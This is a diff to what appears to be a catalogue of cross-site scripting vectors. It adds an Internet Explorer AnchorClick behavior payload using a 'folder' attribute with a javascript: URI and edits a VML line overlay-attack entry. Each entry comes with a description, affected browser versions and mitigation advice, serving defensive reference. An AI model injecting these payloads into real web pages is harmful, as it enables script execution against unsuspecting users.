@@ -1057,11 +1057,11 @@ var items =
         'tags'       : ['xss', 'javascript', 'behavior', 'vml', 'internet explorer'],
         'reporter'   : 'LeverOne'
     },
-    { /* ID 35 - VML Line object utilizing href attribute with JavaScript URI   */
+    { /* ID 35 - VML line object utilizing href attribute with JavaScript URI   */
         'id'         : 35,
         'category'   : 'behavior', 
         'name'       : {
-            'en' : 'VML Line object utilizing href attribute with JavaScript URI',
+            'en' : 'VML line object utilizing href attribute with JavaScript URI',
             'jp' : '',
             'ru' : '',
             'de' : ''
@@ -1069,6 +1069,35 @@ var items =
         'data'       : '1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=%js_uri_alert% strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',
         'description': {
             'en' : 'The vector paints a very thick and wide line responding to clicks with JavaScript execution via JavaScript URI. Note that the actual URI is being masked in the status bar. During an overlay attack the victim will not know about the payload via status bar.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'tickets'    : [],
+        'howtofix'   : {
+            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },            
+        'browsers'   : {
+            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
+        },
+        'tags'       : ['xss', 'javascript', 'behavior', 'vml', 'internet explorer'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 36 - AnchorClick behavior enabling folder attribute as href replacement  */
+        'id'         : 36,
+        'category'   : 'behavior', 
+        'name'       : {
+            'en' : 'AnchorClick behavior enabling folder attribute as href replacement',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>',
+        'description': {
+            'en' : 'Using the AnchorClick behavior allows to use the "folder" attribute as replacement for a "href" attribute on <A> elements.',
             'jp' : '',
             'ru' : '',
             'de' : ''
